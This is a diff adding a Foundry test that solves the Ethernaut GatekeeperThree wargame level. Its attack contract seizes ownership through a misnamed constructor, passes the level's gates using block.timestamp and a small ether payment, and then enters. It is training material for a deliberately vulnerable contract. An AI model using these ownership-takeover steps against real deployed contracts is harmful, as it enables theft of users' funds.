@@ -4,6 +4,7 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 import "./utils/BaseTest.sol";
 import "../src/Ethernaut.sol";
+import "../src/levels/28-GatekeeperThree/SimpleTrick.sol";
 import "../src/levels/28-GatekeeperThree/GatekeeperThree.sol";
 import "../src/levels/28-GatekeeperThree/GatekeeperThreeFactory.sol";
 
@@ -28,6 +29,34 @@ contract GatekeeperThreeTest is Test, BaseTest {
     function _attack() public override {
         vm.startPrank(attacker);
 
+        GatekeeperThreeAttack attack = new GatekeeperThreeAttack(levelAddr);
+        attack.attack{value: 0.0011 ether}();
+
         vm.stopPrank();
+    }
+}
+
+contract GatekeeperThreeAttack {
+    GatekeeperThree public level;
+
+    constructor(address payable _levelAddr) {
+        level = GatekeeperThree(_levelAddr);
+    }
+
+    function attack() public payable {
+        // 1. Initiate gatekeeper by calling wrongly declared constructor
+        level.construct0r();
+
+        // 2. Create trick contract
+        level.createTrick();
+
+        // 3. Call getAllowance() to set allow_entrance to true
+        level.getAllowance(block.timestamp);
+
+        // 4. Send 0.0011 ether to contract to pass gateThree
+        (bool success, ) = address(level).call{value: 0.0011 ether}("");
+        require(success, "Failed to send ether");
+
+        level.enter();
     }
 }
